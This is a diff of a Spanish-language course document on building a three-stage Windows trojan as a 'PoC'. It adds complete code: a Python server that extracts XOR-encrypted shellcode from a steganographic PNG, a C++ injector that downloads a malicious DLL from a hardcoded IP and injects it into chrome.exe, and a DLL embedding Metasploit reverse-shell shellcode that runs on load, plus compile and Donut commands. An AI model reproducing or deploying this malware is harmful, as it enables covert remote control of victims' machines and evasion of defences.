@@ -1,24 +1,19 @@
 ## PONENCIA: Desarrollo de malware
 by @n3xu5_666
 
-El malware de este curso es una PoC cuyo objetivo es realizar una inyección de shellcode en un proceso remoto arbitrario y obtener una reverse shell. Para conseguir este objetivo, el malware está dividido en tres stages o etapas:
+El malware de este curso es una PoC cuyo objetivo es realizar una inyección de shellcode en un proceso remoto arbitrario y obtener una reverse shell.
 
-1. Shellcode Injector (troyan.exe): Esta etapa del malware se encarga de inyectar en un proceso arbitrario (chrome.exe) un shellcode cifrado (dllinyectorencrypted.bin) con XOR (xor.py) y embebido en una imagen (pornhublsb.png) mediante la técnica de esteganografía LSB (lsb.py). Esto lo consigue enviando el PNG a un servidor remoto en la nube que se va a encargar de extraer el shellcode payload del PNG y enviarlo de regreso cifrado hacia la instancia de esta primera etapa en la máquina víctima para después descifrarlo en tiempo de ejecución e finalmente inyectarlo.
-
-2. Dropper y DLL Injector (dllinjector.exe): Esta etapa del malware descarga un DLL malicioso (evildll.dll) desde el servidor en la nube, lo carga y ejecuta en el proceso inyectado (chrome.exe) haciendo uso de LoadLibraryA. Esta etapa del malware se usa en formato de shellcode payload (dllinjector.bin) y para transformarlo a este formato nos apoyamos de la herramienta Donut.
-
-3. DLL Malicioso (evildll.dll): Esta etapa del malware es un DLL que se va a encargar de ejecutar un shellcode payload malicioso en la memoria del proceso inyectado, justo cuando es cargado en la memoria de ejecución, que nos va a dar una reverse shell, conectándose directamente al servidor C2 en la nube. Para conseguir esto realiza el proceso estándar de un shellcode loader.
-
-- Arquitectura del malware
+ - Arquitectura del malware
 ![malware arch](../img/malwareArchitecture.jpg)
+
+La ponencia muestra su desarrollo desde Distribucion Linux Debian, sin embargo esto tambien es viable desde el Sistema Operativo Android apoyandonos con el [emulador de terminal Termux](https://github.com/termux)
 
 - Dependencias
 ```bash
 apt update && yes|apt upgrade
 yes|apt install curl mingw-w64 python python-pip python-pillow python-numpy
-python3 -m pip --no-cache-dir install wave
 ```
-NOTA: en distribuciones Linux pillow y numpy se instala desde PIP.
+	NOTA: en distribuciones Linux pillow y numpy se instala desde PIP.
 
 METASPLOIT-FRAMEWORK con [Termux-packages](https://github.com/ivam3/termux-packages) de @Ivam3 :
 ```bash
@@ -33,6 +28,12 @@ yes|apt install metasploit-framework
 mkdir -p PoC-maldev && cd $_ # Crea e ingresa al directorio PoC-maldev
 python -m pip env venv  # Crea un entorno virtual para python
 ```
+
+Para conseguir este objetivo, el malware está dividido en tres stages o etapas :
+
+1. Shellcode Injector (troyan.exe): Esta etapa del malware se encarga de inyectar en un proceso arbitrario (chrome.exe) un shellcode cifrado (dllinyectorencrypted.bin) con XOR (xor.py) y embebido en una imagen (pornhublsb.png) mediante la técnica de esteganografía LSB (lsb.py). Esto lo consigue enviando el PNG a un servidor remoto en la nube que se va a encargar de extraer el shellcode payload del PNG y enviarlo de regreso cifrado hacia la instancia de esta primera etapa en la máquina víctima para después descifrarlo en tiempo de ejecución e finalmente inyectarlo.
+
+    Apoyate con el video de la ponencia en su [Primera Parte](https://t.me/Ivam3_Bot) al adquirir tu [membresia de la comunidad](https://www.youtube.com/ivam3bycinderella/join)
 
 - Descarga de imagen .png
 ```bash
@@ -49,15 +50,20 @@ generate -f raw -o venv/shellcode.bin
 
 msfconsole -q -r venv/msfshellcode.rc
 ```
-Sustituye 0.0.0.0 por tu Protocolo de Internet Local (IPL) y el '0000' por el puerto de tu eleccion.
+	Sustituye 0.0.0.0 por tu Protocolo de Internet Local (IPL) y el '0000' por el puerto de tu eleccion.
 
 - Activa el entorno virtual de Python
 ```bash
 source venv/bin/activate
 ```
 
+- Instalacion de modulos de Python requeridos
+```bash
+python3 -m pip --no-cache-dir install wave donut-shellcode
+```
+
 - Script PoC-maldev/venv/xor.py
-```python3
+```python
 import sys
 
 def xor(inputData, encKey):
@@ -84,8 +90,9 @@ if __name__ == "__main__":
 		#print f"Usage: python3 {sys.argv[0]} <payload file>"
 		sys.exit(1)
 ```
+
 - Script PoC-maldev/venv/lsb.py
-```python3
+```python
 from PIL import Image
 import numpy as np
 import sys
@@ -459,15 +466,331 @@ x86_64-w64-mingw32-g++ -o trojan trojan.cpp -lwsock32 -lws2_32 -Wl,--subsystem,w
 ```
 
 - Compilacion
-  Se requieren en el mismo directorio los archivos :
+    Se requieren en el mismo directorio los archivos :
 
-    • trojan.cpp
-    • resources.rc
-    • resources.h
-    • imageninfectada.png
-    • compile.sh
+      • trojan.cpp
+      • resources.rc
+      • resources.h
+      • imageninfectada.png
+      • compile.sh
 ```bash
 bash compile.sh
 ```
 
-- Continua en la [Segunda Parte](https://t.me/Ivam3byCinderella?livestream)
+Dudas? ... Unete a la [charla](https://t.me/Ivam3by_Cinderella/22) en nuestro [Chat de Telegram](https://t.me/Ivam3by_Cinderella)
+
+
+2. Dropper y DLL Injector (dllinjector.exe): Esta etapa del malware descarga un DLL malicioso (evildll.dll) desde el servidor en la nube, lo carga y ejecuta en el proceso inyectado (chrome.exe) haciendo uso de LoadLibraryA. Esta etapa del malware se usa en formato de shellcode payload (dllinjector.bin) y para transformarlo a este formato nos apoyamos de la herramienta Donut.
+
+    Apoyate con el video de la ponencia en su [Segunda Parte](https://t.me/Ivam3_Bot) al adquirir tu [Membresia de la comunidad](https://www.youtube.com/ivam3bycinderella/join)
+
+- Script PoC-maldev/server.py
+```python3
+import socket
+import sys
+import numpy as np
+from PIL import Image
+
+class Server:
+  def init(self, ip, port):
+    self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    self.server.bind((ip, port))
+    self.server.listen(1)
+    self.server.settimeout(20)
+
+  def run(self):
+    while True:
+      try:
+        client, address = self.server.accept()
+        print(f"\nIncoming connection from {address[0]}:{address[1]}\n")
+
+        # Recive image bytes and extract encrypted shellcode
+        print("Receiving icon bytes...")
+        with open("file.bin", "wb") as file:
+          while True:
+            data = client.recv(1024)
+            #print(data)
+            if data == b"":
+              client.close()
+              break
+            client.send("OK".encode('latin-1'))
+            file.write(data)
+          file.close()
+        self.extractBits("file.bin")
+
+        client, address = self.server.accept()
+        print(f"\nIncoming connection from {address[0]}:{address[1]}\n")
+
+        # Send extracted encrypted shellcode bytes
+        print("Sending encrypted shellcode...\n")
+        with open("encrypted.bin", "rb") as file:
+          while True:
+            byte_content = file.read(1024)
+            if not byte_content:
+              client.close()
+              break
+            client.send(byte_content)
+            data = client.recv(1024)
+            #print(f"Bytes sent: {byte_content}")
+            #print(f"Bytes recieved: {data}")
+            if data == "OK":
+              next
+        print("Encrypted shellcode sent...\n")
+
+
+        #print("Sending encrypted shellcode...\n")
+        #with open("encrypted.bin", "rb") as file:
+        #  byte_content = file.read(1024)
+        #  client.send(byte_content)
+        #print("Encrypted shellcode sent...\n")
+        #client.close()
+
+      except KeyboardInterrupt:
+        print("")
+        sys.exit()
+      except Exception as e:
+        print(f"Error: {e}")
+        pass
+
+  def extractBits(self, path):
+    img = Image.open(path, 'r')
+    array = np.array(list(img.getdata()))
+    if img.mode == 'RGB':
+      n = 3
+    elif img.mode == 'RGBA':
+      n = 4
+    total_pixels = array.size//n
+    hidden_bits = ""
+    for p in range(total_pixels):
+      for q in range(0,3):
+        hidden_bits += (bin(array[p][q])[2:][-1])
+    hidden_bits = [hidden_bits[i:i+8] for i in range(0, len(hidden_bits), 8)]
+    message = b""
+    for i in range(len(hidden_bits)):
+      if message[-16:] == b"$end_of_message$":
+        break
+      else:
+        message += chr(int(hidden_bits[i],2)).encode('latin-1')
+    dstFile = open("encrypted.bin", "wb")
+    if b"$end_of_message" in message:
+      dstFile.write(message[:-16])
+      dstFile.close()
+      print("\nUnhidden message successfully!\n")
+    else:
+      print("\nNo Hidden Message Found\n")
+
+if name == "main":
+  server = Server("192.168.100.18", 4444)
+  server.run()
+```
+
+- Script PoC-maldev/dllinjector.cpp
+```cpp
+#include <windows.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <tlhelp32.h>
+#include <urlmon.h>
+#include <wininet.h>
+
+#pragma comment(lib, "Urlmon.lib")
+#pragma comment(lib, "Wininet.lib")
+
+int SearchForProcess(const char *processName) {
+
+	HANDLE hSnapshotOfProcesses;
+	PROCESSENTRY32 processStruct;
+	int pid = 0;
+
+	hSnapshotOfProcesses = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+	if (INVALID_HANDLE_VALUE == hSnapshotOfProcesses) return 0;
+
+	processStruct.dwSize = sizeof(PROCESSENTRY32); 
+
+	if (!Process32First(hSnapshotOfProcesses, &processStruct)) {
+		CloseHandle(hSnapshotOfProcesses);
+		return 0;
+	}
+
+	while (Process32Next(hSnapshotOfProcesses, &processStruct)) {
+		if (lstrcmpiA(processName, processStruct.szExeFile) == 0) {
+			pid = processStruct.th32ProcessID;
+			break;
+		}
+	}
+
+	CloseHandle(hSnapshotOfProcesses);
+
+	return pid;
+}
+
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+//int main(int argc, char *argv[]) {
+	
+	HANDLE hProcess;
+	PVOID pRemoteProcAllocMem;
+	PTHREAD_START_ROUTINE pLoadLibrary = NULL;
+	//char pathToDLL[] = "C:\\Users\\sciar\\AppData\\Local\\Temp\\evildll.dll";
+	//char pathToDLL[] = "C:\\Program Files\\Google\\Chrome\\Application\\108.0.5359.125\\evildll.dll";
+	//char pathToDLL[] = "C:\\Users\\sciar\\Desktop\\CrashCourseMaldev\\Part2\\evildll.dll";
+	//char pathToDLL[] = "C:\\mspaintDLL.dll";
+	char pathToDLL[MAX_PATH] = "";
+	char url[] = "http://192.168.100.18:80/evildll.dll";
+	char processToInject[] = "chrome.exe";
+	int pid = 0;
+
+	GetTempPath(MAX_PATH, pathToDLL);
+	strcat(pathToDLL, "\\evildll.dll");
+
+	URLDownloadToFile(NULL, (char *) url, (char *) pathToDLL, 0, NULL);
+	DeleteUrlCacheEntry((char *) url);
+	
+	pid = SearchForProcess(processToInject);
+	if ( pid == 0) {
+		//printf("Process To Inject NOT FOUND! Exiting.\n");
+		return -1;
+	}
+
+	//printf("Process To Inject PID: [ %d ]\nInjecting...", pid);
+
+	pLoadLibrary = (PTHREAD_START_ROUTINE) GetProcAddress( GetModuleHandle("Kernel32.dll"), "LoadLibraryA");
+
+	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)(pid));
+
+	if (hProcess != NULL) {
+		pRemoteProcAllocMem = VirtualAllocEx(hProcess, NULL, sizeof(pathToDLL), MEM_COMMIT, PAGE_READWRITE);	
+	
+		WriteProcessMemory(hProcess, pRemoteProcAllocMem, (LPVOID) pathToDLL, sizeof(pathToDLL), NULL);
+
+		CreateRemoteThread(hProcess, NULL, 0, pLoadLibrary, pRemoteProcAllocMem, 0, NULL);
+		//printf("done!\nallocated Memory addr = %p\n", pRemoteProcAllocMem);
+
+		CloseHandle(hProcess); 
+	}
+	else {
+		//printf("OpenProcess failed! Exiting.\n");
+		return -2;
+	}
+}
+```
+
+- Script PoC-maldev/evildll.cpp
+```cpp
+#include <windows.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+// Msfconsole reverse shell shellcode generetad with: LHOST=192.168.100.18, LPORT=443, generate -f c -o shellcode.bin
+unsigned char shellcodePayload[460] = {
+	0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
+	0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
+	0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
+	0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
+	0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
+	0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,
+	0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
+	0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
+	0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,
+	0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
+	0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,
+	0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
+	0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,
+	0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,
+	0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
+	0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
+	0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x49,
+	0xBE, 0x77, 0x73, 0x32, 0x5F, 0x33, 0x32, 0x00, 0x00, 0x41, 0x56, 0x49,
+	0x89, 0xE6, 0x48, 0x81, 0xEC, 0xA0, 0x01, 0x00, 0x00, 0x49, 0x89, 0xE5,
+	0x49, 0xBC, 0x02, 0x00, 0x01, 0xBB, 0xC0, 0xA8, 0x64, 0x12, 0x41, 0x54,
+	0x49, 0x89, 0xE4, 0x4C, 0x89, 0xF1, 0x41, 0xBA, 0x4C, 0x77, 0x26, 0x07,
+	0xFF, 0xD5, 0x4C, 0x89, 0xEA, 0x68, 0x01, 0x01, 0x00, 0x00, 0x59, 0x41,
+	0xBA, 0x29, 0x80, 0x6B, 0x00, 0xFF, 0xD5, 0x50, 0x50, 0x4D, 0x31, 0xC9,
+	0x4D, 0x31, 0xC0, 0x48, 0xFF, 0xC0, 0x48, 0x89, 0xC2, 0x48, 0xFF, 0xC0,
+	0x48, 0x89, 0xC1, 0x41, 0xBA, 0xEA, 0x0F, 0xDF, 0xE0, 0xFF, 0xD5, 0x48,
+	0x89, 0xC7, 0x6A, 0x10, 0x41, 0x58, 0x4C, 0x89, 0xE2, 0x48, 0x89, 0xF9,
+	0x41, 0xBA, 0x99, 0xA5, 0x74, 0x61, 0xFF, 0xD5, 0x48, 0x81, 0xC4, 0x40,
+	0x02, 0x00, 0x00, 0x49, 0xB8, 0x63, 0x6D, 0x64, 0x00, 0x00, 0x00, 0x00,
+	0x00, 0x41, 0x50, 0x41, 0x50, 0x48, 0x89, 0xE2, 0x57, 0x57, 0x57, 0x4D,
+	0x31, 0xC0, 0x6A, 0x0D, 0x59, 0x41, 0x50, 0xE2, 0xFC, 0x66, 0xC7, 0x44,
+	0x24, 0x54, 0x01, 0x01, 0x48, 0x8D, 0x44, 0x24, 0x18, 0xC6, 0x00, 0x68,
+	0x48, 0x89, 0xE6, 0x56, 0x50, 0x41, 0x50, 0x41, 0x50, 0x41, 0x50, 0x49,
+	0xFF, 0xC0, 0x41, 0x50, 0x49, 0xFF, 0xC8, 0x4D, 0x89, 0xC1, 0x4C, 0x89,
+	0xC1, 0x41, 0xBA, 0x79, 0xCC, 0x3F, 0x86, 0xFF, 0xD5, 0x48, 0x31, 0xD2,
+	0x48, 0xFF, 0xCA, 0x8B, 0x0E, 0x41, 0xBA, 0x08, 0x87, 0x1D, 0x60, 0xFF,
+	0xD5, 0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D,
+	0xFF, 0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB,
+	0xE0, 0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41,
+	0x89, 0xDA, 0xFF, 0xD5
+};
+
+unsigned int lengthOfshellcodePayload = sizeof(shellcodePayload);
+
+extern __declspec(dllexport) int Go(void);
+int RunShellcode(void) {
+	
+	void * alloc_mem;
+	BOOL retval;
+	HANDLE threadHandle;
+	DWORD oldprotect = 0;
+
+	alloc_mem = VirtualAlloc(0, lengthOfshellcodePayload, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+
+	RtlMoveMemory(alloc_mem, shellcodePayload, lengthOfshellcodePayload);
+	
+	retval = VirtualProtect(alloc_mem, lengthOfshellcodePayload, PAGE_EXECUTE_READ, &oldprotect);
+
+	if ( retval != 0 ) {
+		threadHandle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) alloc_mem, 0, 0, 0);
+		WaitForSingleObject(threadHandle, 0);
+	}
+	return 0;
+}
+
+BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD reasonForCall, LPVOID lpReserved ) {
+
+	switch ( reasonForCall ) {
+	case DLL_PROCESS_ATTACH:
+		RunShellcode();
+		break;
+	case DLL_THREAD_ATTACH:
+		break;
+	case DLL_THREAD_DETACH:
+		break;
+	case DLL_PROCESS_DETACH:
+		break;
+	}
+	return TRUE;
+}
+```
+
+Listo!! Hora de compilar nuestro dll. En la ponencia el proceso fue realizado desde un SO Windows en donde se requiere los Native Tools instalados (x64 native tools command prompt for VS 2022) junto con los siguientes scripts :
+
+- Script PoC-maldev/compiledll.bat : es el ejecutable compilador para Windows 
+```bat
+@ECHO OFF
+
+cl.exe /O2 /D_USRDLL /D_WINDLL evildll.cpp evildll.def /MT /link /DLL /OUT:evildll.dll
+```
+
+- Script PoC-maldev/compiledllinjector.bat
+```bat
+@ECHO OFF
+
+cl.exe /O2 /D_USRDLL /D_WINDLL evildll.cpp evildll.def /MT /link /DLL /OUT:evildll.dll
+```
+    Esto creara los archivos dllinjector.exe and evil.dll
+
+- Proceso de Compilacion con [donut](https://github.com/TheWover/donut)
+```bash
+donut -e 1 -x 1 -t evil.dll loader.bin
+```
+
+Dudas? ... Unete a la [charla](https://t.me/Ivam3by_Cinderella/22) en nuestro [Chat de Telegram](https://t.me/Ivam3by_Cinderella)
+
+
+3. DLL Malicioso (evildll.dll): Esta etapa del malware es un DLL que se va a encargar de ejecutar un shellcode payload malicioso en la memoria del proceso inyectado, justo cuando es cargado en la memoria de ejecución, que nos va a dar una reverse shell, conectándose directamente al servidor C2 en la nube. Para conseguir esto realiza el proceso estándar de un shellcode loader.
+
+    Asiste a la [Tercera Parte](https://t.me/Ivam3byCinderella?livestream) de la ponencia en el [canal de Telegram](https://t.me/Ivam3byCinderella) de la comunidad.
